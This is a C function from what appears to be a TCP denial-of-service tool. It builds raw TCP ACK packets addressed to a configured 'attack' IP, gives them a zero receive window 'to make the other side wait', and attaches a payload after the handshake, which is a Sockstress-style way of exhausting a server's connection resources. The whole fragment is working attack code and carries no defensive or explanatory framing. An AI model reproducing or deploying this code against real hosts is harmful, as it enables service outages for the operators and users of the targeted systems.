void send_ack(unsigned char *packet)
{
    if(DEBUG_MODE)
        printf("[d] ---SENDING ACK...\n");
    static int s_out = -1;

    if(s_out == -1)
    {
        if(DEBUG_MODE)
            printf("[d] Initializing ACK socket...\n");
        s_out = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(s_out < 0)
        {
            perror("[!] Error creating socket to send ACK/SYNACK");
            exit(-1);
        }
        if(bind(s_out, (struct sockaddr*)&globalArgs.iface_addr, sizeof(struct sockaddr_in)) == -1)
        {
            perror("[!] Error binding socket to send ACK/SYNACK");
            exit(-1);
        }
    }

    struct sockaddr_in attack_addr;
    attack_addr.sin_family = AF_INET;
    attack_addr.sin_addr = globalArgs.attack_ip;

    struct ip_header *ip = (struct ip_header*)packet;
    struct tcp_header *synack = (struct tcp_header*)(packet + 4*(ip->ver_ihl & 0x0F));

    unsigned char reply[sizeof(struct tcp_header) + MAX_PAYLOAD_SIZE];
    struct tcp_header *ack = (struct tcp_header*)reply;
    ack->src_port = synack->dest_port;
    ack->dest_port = synack->src_port;
    ack->ack = synack->seq; // Only add 1 if it's a synack (done below)
    ack->seq = synack->ack; 

    ack->off_res_flags = 0;
    // set data offset
    ack->off_res_flags |= htons(0x6000);
    // set ack flag
    ack->off_res_flags |= htons(0x0010);

    ack->window = 0; // zero window to make the other side wait
    ack->urg_ptr = 0;
    ack->opts_pad = 0;

    // If the received packet is a SYNACK, attach the payload
    unsigned long packet_size = sizeof(struct tcp_header);
    if(synack->off_res_flags & htons(0x0010) && synack->off_res_flags & htons(0x0002))
    {
        ack->ack = htonl(ntohl(synack->seq) + 1);
        ack->seq = synack->ack;
        memcpy(reply + sizeof(struct tcp_header), globalArgs.payload, globalArgs.payload_size);
        packet_size += globalArgs.payload_size;
    }

    calc_tcp_checksum(reply, packet_size, globalArgs.iface_addr.sin_addr, attack_addr.sin_addr);
    int ret = sendto(s_out, reply, packet_size, 0,
            (struct sockaddr*)&attack_addr, sizeof(struct sockaddr_in));
    if(ret == -1)
        perror("[!] Error sending ACK/SYNACK packet");
}